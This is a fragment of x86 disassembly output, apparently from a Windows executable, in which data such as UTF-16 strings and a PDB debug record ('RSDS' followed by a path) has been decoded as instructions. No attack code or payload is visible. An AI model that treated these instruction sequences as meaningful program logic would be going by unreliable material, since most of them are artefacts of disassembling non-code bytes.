  4338f5:	inc    edi
  4338f6:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  4338fb:	add    BYTE PTR [edx+0x0],al
  4338fe:	pop    eax
  4338ff:	add    BYTE PTR [edi+0x0],al
  433902:	add    BYTE PTR ss:[edi+0x0],bl
  433906:	push   esi
  433907:	add    BYTE PTR [ebx+0x0],al
  43390a:	dec    esi
  43390b:	add    BYTE PTR [eax+eax*1+0x0],al
  43390f:	add    BYTE PTR [edi+0x0],cl
  433912:	dec    ebp
  433913:	add    BYTE PTR [edi+0x0],al
  433916:	xor    eax,DWORD PTR [eax]
  433918:	pop    edi
  433919:	add    BYTE PTR [eax+eax*1],dh
  43391c:	dec    esi
  43391d:	add    BYTE PTR [edx+0x0],bl
  433920:	cmp    BYTE PTR [eax],al
  433922:	pop    edi
  433923:	add    BYTE PTR [eax+0x0],bl
  433926:	cmp    BYTE PTR [eax],al
  433928:	add    BYTE PTR [eax],al
  43392a:	push   edx
  43392b:	add    BYTE PTR [eax+0x0],bl
  43392e:	push   ecx
  43392f:	add    BYTE PTR [edi+0x0],bl
  433932:	dec    esp
  433933:	add    BYTE PTR [edx+0x0],dl
  433936:	dec    ecx
  433937:	add    BYTE PTR [edi+0x0],cl
  43393a:	inc    esp
  43393b:	add    BYTE PTR [edi+0x0],bl
  43393e:	dec    edi
  43393f:	add    BYTE PTR [ebx],dh
  433941:	add    BYTE PTR [eax+eax*1+0x0],al
  433945:	add    BYTE PTR [ebx+0x0],al
  433948:	push   eax
  433949:	add    BYTE PTR [ebp+0x0],al
  43394c:	pop    edi
  43394d:	add    BYTE PTR ds:0x39004500,dh
  433953:	add    BYTE PTR [edi+0x0],bl
  433956:	push   esi
  433957:	add    BYTE PTR [eax],al
  433959:	add    BYTE PTR [edi+0x0],al
  43395c:	dec    esi
  43395d:	add    BYTE PTR [esi+0x0],dl
  433960:	pop    edi
  433961:	add    BYTE PTR [edi+0x0],al
  433964:	push   esp
  433965:	add    BYTE PTR [eax+0x0],cl
  433968:	xor    al,BYTE PTR [eax]
  43396a:	xor    DWORD PTR [eax],eax
  43396c:	pop    edi
  43396d:	add    BYTE PTR [edi+0x0],cl
  433970:	add    BYTE PTR ss:[ebx],dh
  433973:	add    BYTE PTR [eax],al
  433975:	add    BYTE PTR [eax+eax*1+0x45],al
  433979:	add    BYTE PTR [ecx+0x0],cl
  43397c:	pop    edi
  43397d:	add    BYTE PTR [edx+0x0],dl
  433980:	dec    eax
  433981:	add    BYTE PTR [eax+eax*1],dh
  433984:	dec    eax
  433985:	add    BYTE PTR [eax],al
  433987:	add    BYTE PTR [eax],al
  433989:	push   edx
  43398a:	push   ebx
  43398b:	inc    esp
  43398c:	push   ebx
  43398d:	mov    bh,0x9
  43398f:	add    al,0xa5
  433991:	out    dx,al
  433992:	test   al,0xf7
  433994:	inc    esp
  433995:	mov    ds,WORD PTR [eax+0x7452f719]
  43399b:	add    esp,ebp
  43399d:	push   cs
  43399e:	add    BYTE PTR [eax],al
  4339a0:	add    BYTE PTR [ecx+0x3a],dl
  4339a3:	pop    esp
  4339a4:	js     0x4339fe
  4339a6:	ins    DWORD PTR es:[edi],dx
  4339a7:	arpl   WORD PTR [esi+0x76],sp
  4339aa:	addr16 jp 0x433a21
  4339ad:	pop    esp
  4339ae:	inc    ebp
  4339af:	inc    esi
  4339b0:	dec    edx
  4339b1:	bound  ebp,QWORD PTR [edx+0x67]
  4339b4:	popa   
  4339b5:	push   0x6c776a5c
  4339ba:	bound  esp,QWORD PTR [eax+ebp*2+0x70]
  4339be:	popa   
  4339bf:	bound  esi,QWORD PTR [edi+0x65]
  4339c2:	cs jo  0x433a29
  4339c5:	bound  eax,QWORD PTR [eax]
	...
